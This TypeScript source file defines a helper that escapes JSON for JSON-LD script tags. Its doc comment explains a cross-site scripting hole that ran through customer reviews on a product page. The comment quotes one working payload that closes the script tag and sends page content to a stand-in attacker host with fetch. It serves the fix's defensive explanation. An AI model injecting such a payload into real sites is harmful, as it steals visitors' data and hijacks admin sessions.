/**
 * Serialise structured data for embedding in a `<script type="application/ld+json">`.
 *
 * ## Why `JSON.stringify` alone is not enough
 *
 * An HTML parser does not know it is looking at JSON. Inside a `<script>` element it
 * scans for the literal characters `</script`, and the moment it finds them the
 * script ends — wherever that happens to be, including in the middle of a string.
 * `JSON.stringify` escapes quotes, backslashes and control characters, because those
 * are what would break *JSON*. It has no reason to touch `<` or `/`, so it happily
 * emits them verbatim.
 *
 * That gap is a cross-site scripting hole wherever any part of the object can be
 * influenced by a person. On the product page it could: the structured data carries
 * `review.author`, `review.title` and `review.body`, which come from
 * `submitted_reviews` — written by signed-in shoppers through `submitReviewAction`
 * and published to the page immediately by its `revalidatePath`, with no approval
 * step in between. A review body of
 *
 *     </script><script>fetch('https://attacker.example/'+document.body.innerHTML)</script>
 *
 * closed the JSON-LD block early and ran on the product page for every visitor,
 * including staff. The session cookie is `httpOnly` so it could not be read directly,
 * but same-origin script can act as whoever is looking at the page, which for an
 * admin browsing the storefront is the whole admin API.
 *
 * ## The escaping
 *
 * `\u003c` and friends are ordinary JSON string escapes: a parser turns them straight
 * back into `<`, so Google and every other consumer reads exactly the same data. Only
 * the HTML parser's view changes, and it now never sees a `<` it could act on.
 *
 * - `<` and `>` are what `</script` and `<!--` are built from.
 * - `&` is escaped so an entity cannot be smuggled in for a parser to decode first.
 * - U+2028 and U+2029 are line terminators in JavaScript but legal raw inside a JSON
 *   string. They are harmless in `application/ld+json`, but escaping them keeps this
 *   helper safe to reuse for data embedded in an executable script, which is the next
 *   thing someone will reach for it to do.
 *
 * Prefer this over `JSON.stringify` for anything that ends up inside a script tag,
 * even when the data looks entirely internal today. The product page's own comment
 * read "no user input reaches this string" while five customer-written fields did.
 */
export function jsonLdScript(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
